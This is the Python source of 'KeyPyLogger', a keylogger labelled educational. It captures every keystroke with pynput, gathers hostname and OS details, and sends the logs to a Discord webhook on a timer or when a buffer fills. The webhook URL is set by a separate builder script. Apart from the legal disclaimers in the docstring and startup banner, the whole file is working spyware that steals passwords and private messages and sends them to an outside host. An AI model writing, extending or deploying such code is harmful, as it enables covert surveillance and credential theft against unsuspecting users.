#!/usr/bin/env python3
"""
KeyPyLogger - Educational Keylogger
LEGAL WARNING: This tool is for educational and authorized security testing only.
Unauthorized use is illegal. Only use on systems you own or have explicit permission to test.
"""

import os
import sys
import platform
import threading
import time
from datetime import datetime
from pynput import keyboard
import requests
import json

# Configuration - Will be replaced by builder
WEBHOOK_URL = "WEBHOOK_URL_PLACEHOLDER"
SEND_INTERVAL = 60  # Send logs every 60 seconds
MAX_BUFFER_SIZE = 1000  # Maximum characters before forcing send


class KeyLogger:
    def __init__(self, webhook_url, send_interval=60):
        """
        Initialize the keylogger

        Args:
            webhook_url (str): Discord webhook URL
            send_interval (int): Interval in seconds to send logs
        """
        self.webhook_url = webhook_url
        self.send_interval = send_interval
        self.log_buffer = []
        self.running = False
        self.system_info = self._get_system_info()

    def _get_system_info(self):
        """Collect basic system information"""
        return {
            "hostname": platform.node(),
            "os": platform.system(),
            "os_version": platform.version(),
            "architecture": platform.machine(),
            "python_version": platform.python_version()
        }

    def _format_key(self, key):
        """Format key press for logging"""
        try:
            # Handle special keys
            if hasattr(key, 'char') and key.char is not None:
                return key.char
            else:
                # Special keys formatting
                special_keys = {
                    keyboard.Key.space: ' ',
                    keyboard.Key.enter: '\n',
                    keyboard.Key.tab: '\t',
                    keyboard.Key.backspace: '[BACKSPACE]',
                    keyboard.Key.delete: '[DELETE]',
                    keyboard.Key.shift: '[SHIFT]',
                    keyboard.Key.shift_r: '[SHIFT]',
                    keyboard.Key.ctrl: '[CTRL]',
                    keyboard.Key.ctrl_r: '[CTRL]',
                    keyboard.Key.alt: '[ALT]',
                    keyboard.Key.alt_r: '[ALT]',
                    keyboard.Key.caps_lock: '[CAPS]',
                    keyboard.Key.esc: '[ESC]',
                    keyboard.Key.up: '[UP]',
                    keyboard.Key.down: '[DOWN]',
                    keyboard.Key.left: '[LEFT]',
                    keyboard.Key.right: '[RIGHT]',
                }
                return special_keys.get(key, f'[{str(key).replace("Key.", "")}]')
        except Exception as e:
            return f'[ERROR:{str(e)}]'

    def _on_press(self, key):
        """Callback for key press events"""
        try:
            formatted_key = self._format_key(key)
            self.log_buffer.append(formatted_key)

            # Force send if buffer is too large
            if len(''.join(self.log_buffer)) >= MAX_BUFFER_SIZE:
                self._send_logs()

        except Exception as e:
            print(f"Error in key press handler: {e}")

    def _send_logs(self):
        """Send accumulated logs to Discord webhook"""
        if not self.log_buffer:
            return

        try:
            # Prepare the message
            log_content = ''.join(self.log_buffer)

            if not log_content.strip():
                self.log_buffer = []
                return

            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            # Create Discord embed
            embed = {
                "title": f"🔑 Keylog Report - {self.system_info['hostname']}",
                "description": f"```\n{log_content[:4000]}\n```",  # Discord limit
                "color": 3447003,  # Blue color
                "fields": [
                    {
                        "name": "System",
                        "value": f"{self.system_info['os']} {self.system_info['architecture']}",
                        "inline": True
                    },
                    {
                        "name": "Timestamp",
                        "value": timestamp,
                        "inline": True
                    },
                    {
                        "name": "Buffer Size",
                        "value": f"{len(log_content)} characters",
                        "inline": True
                    }
                ],
                "footer": {
                    "text": "KeyPyLogger - Educational Purpose Only"
                }
            }

            payload = {
                "username": "KeyPyLogger",
                "embeds": [embed]
            }

            # Send to webhook
            response = requests.post(
                self.webhook_url,
                json=payload,
                timeout=10
            )

            if response.status_code == 204:
                # Successfully sent, clear buffer
                self.log_buffer = []
            else:
                print(f"Failed to send logs: {response.status_code}")

        except Exception as e:
            print(f"Error sending logs: {e}")

    def _periodic_send(self):
        """Periodically send logs at specified interval"""
        while self.running:
            time.sleep(self.send_interval)
            if self.running:
                self._send_logs()

    def start(self):
        """Start the keylogger"""
        print(f"[*] Starting KeyPyLogger on {self.system_info['os']}")
        print(f"[*] Hostname: {self.system_info['hostname']}")
        print(f"[*] Logs will be sent every {self.send_interval} seconds")

        # Send initial system info
        self._send_initial_info()

        # Start periodic send thread
        self.running = True
        send_thread = threading.Thread(target=self._periodic_send, daemon=True)
        send_thread.start()

        # Start keyboard listener
        try:
            with keyboard.Listener(on_press=self._on_press) as listener:
                listener.join()
        except KeyboardInterrupt:
            print("\n[*] Stopping keylogger...")
            self.stop()

    def stop(self):
        """Stop the keylogger and send remaining logs"""
        self.running = False
        self._send_logs()  # Send any remaining logs
        print("[*] Keylogger stopped")

    def _send_initial_info(self):
        """Send initial system information"""
        try:
            embed = {
                "title": "🚀 KeyPyLogger Started",
                "color": 5763719,  # Green
                "fields": [
                    {"name": "Hostname", "value": self.system_info['hostname'], "inline": True},
                    {"name": "OS", "value": self.system_info['os'], "inline": True},
                    {"name": "Architecture", "value": self.system_info['architecture'], "inline": True},
                    {"name": "OS Version", "value": self.system_info['os_version'][:100], "inline": False},
                    {"name": "Python Version", "value": self.system_info['python_version'], "inline": True},
                ],
                "timestamp": datetime.utcnow().isoformat(),
                "footer": {"text": "KeyPyLogger - Educational Purpose Only"}
            }

            payload = {"username": "KeyPyLogger", "embeds": [embed]}
            requests.post(self.webhook_url, json=payload, timeout=10)

        except Exception as e:
            print(f"Error sending initial info: {e}")


def main():
    """Main entry point"""
    # Check if webhook URL is configured
    if WEBHOOK_URL == "WEBHOOK_URL_PLACEHOLDER":
        print("[!] ERROR: Webhook URL not configured!")
        print("[!] Please use builder.py to configure the keylogger")
        sys.exit(1)

    # Legal warning
    print("=" * 70)
    print("KeyPyLogger - Educational Keylogger")
    print("=" * 70)
    print("WARNING: This tool is for EDUCATIONAL and AUTHORIZED testing only!")
    print("Unauthorized use of keyloggers is ILLEGAL and unethical.")
    print("Only use on systems you own or have explicit written permission.")
    print("=" * 70)
    print()

    # Create and start keylogger
    logger = KeyLogger(WEBHOOK_URL, SEND_INTERVAL)

    try:
        logger.start()
    except KeyboardInterrupt:
        logger.stop()
    except Exception as e:
        print(f"[!] Error: {e}")
        logger.stop()


if __name__ == "__main__":
    main()
